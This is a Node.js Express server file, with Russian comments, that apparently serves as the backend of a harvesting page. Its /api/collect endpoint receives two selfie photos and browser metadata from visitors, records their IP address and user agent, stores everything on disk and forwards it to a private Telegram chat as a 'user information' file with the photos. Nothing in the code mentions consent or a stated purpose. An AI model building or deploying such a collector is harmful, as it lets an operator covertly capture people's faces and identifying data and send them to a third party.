const express = require('express');
const multer = require('multer');
const path = require('path');
const fs = require('fs');
const cors = require('cors');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

app.use(cors());
app.use(express.static(path.join(__dirname, 'public')));

// Лимит 5MB на файл
const upload = multer({
    storage: multer.memoryStorage(),
    limits: { fileSize: 5 * 1024 * 1024 }
});

const DATA_DIR = path.join(__dirname, 'data');
if (!fs.existsSync(DATA_DIR)) {
    fs.mkdirSync(DATA_DIR, { recursive: true });
}

// Форматирование данных в TXT
function formatMetadata(metadata, reqInfo) {
    let txt = `--- METADATA ---\n`;
    txt += `Timestamp: ${new Date().toISOString()}\n`;
    txt += `IP: ${reqInfo.ip}\n`;
    txt += `User-Agent (Server): ${reqInfo.userAgent}\n\n`;
    txt += `--- BROWSER DATA ---\n`;
    for (const [key, value] of Object.entries(metadata)) {
        if (typeof value === 'object' && value !== null) {
            txt += `${key}: ${JSON.stringify(value, null, 2)}\n`;
        } else {
            txt += `${key}: ${value}\n`;
        }
    }
    return txt;
}

// Отправка в Telegram
async function sendToTelegram(photo1, photo2, txtData) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
    const apiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

    try {
        // 1. Отправка TXT файла
        const txtForm = new FormData();
        txtForm.append('chat_id', TELEGRAM_CHAT_ID);
        txtForm.append('document', new Blob([txtData], { type: 'text/plain' }), 'info.txt');
        txtForm.append('caption', '📄 Информация о пользователе');
        await fetch(`${apiUrl}/sendDocument`, { method: 'POST', body: txtForm });

        // 2. Отправка первого фото
        if (photo1) {
            const photo1Form = new FormData();
            photo1Form.append('chat_id', TELEGRAM_CHAT_ID);
            photo1Form.append('photo', new Blob([photo1.buffer], { type: photo1.mimetype }), 'selfie1.jpg');
            photo1Form.append('caption', '📸 Селфи 1');
            await fetch(`${apiUrl}/sendPhoto`, { method: 'POST', body: photo1Form });
        }

        // 3. Отправка второго фото
        if (photo2) {
            const photo2Form = new FormData();
            photo2Form.append('chat_id', TELEGRAM_CHAT_ID);
            photo2Form.append('photo', new Blob([photo2.buffer], { type: photo2.mimetype }), 'selfie2.jpg');
            photo2Form.append('caption', '📸 Селфи 2');
            await fetch(`${apiUrl}/sendPhoto`, { method: 'POST', body: photo2Form });
        }
    } catch (err) {
        console.error('Telegram error:', err.message);
    }
}

app.post('/api/collect', upload.fields([{ name: 'photo1', maxCount: 1 }, { name: 'photo2', maxCount: 1 }]), async (req, res) => {
    try {
        const metadata = req.body.metadata ? JSON.parse(req.body.metadata) : {};
        const reqInfo = {
            ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress,
            userAgent: req.headers['user-agent']
        };

        const txtData = formatMetadata(metadata, reqInfo);

        // Сохранение на диск
        const dateStr = new Date().toISOString().split('T')[0];
        const sessionDir = path.join(DATA_DIR, dateStr, Date.now().toString());
        fs.mkdirSync(sessionDir, { recursive: true });

        fs.writeFileSync(path.join(sessionDir, 'info.txt'), txtData);
        const photo1 = req.files && req.files['photo1'] ? req.files['photo1'][0] : null;
        const photo2 = req.files && req.files['photo2'] ? req.files['photo2'][0] : null;

        if (photo1) fs.writeFileSync(path.join(sessionDir, 'selfie1.jpg'), photo1.buffer);
        if (photo2) fs.writeFileSync(path.join(sessionDir, 'selfie2.jpg'), photo2.buffer);

        // Отправка в Telegram
        await sendToTelegram(photo1, photo2, txtData);

        res.status(200).json({ success: true });
    } catch (error) {
        console.error('Process error:', error);
        res.status(500).json({ success: false });
    }
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});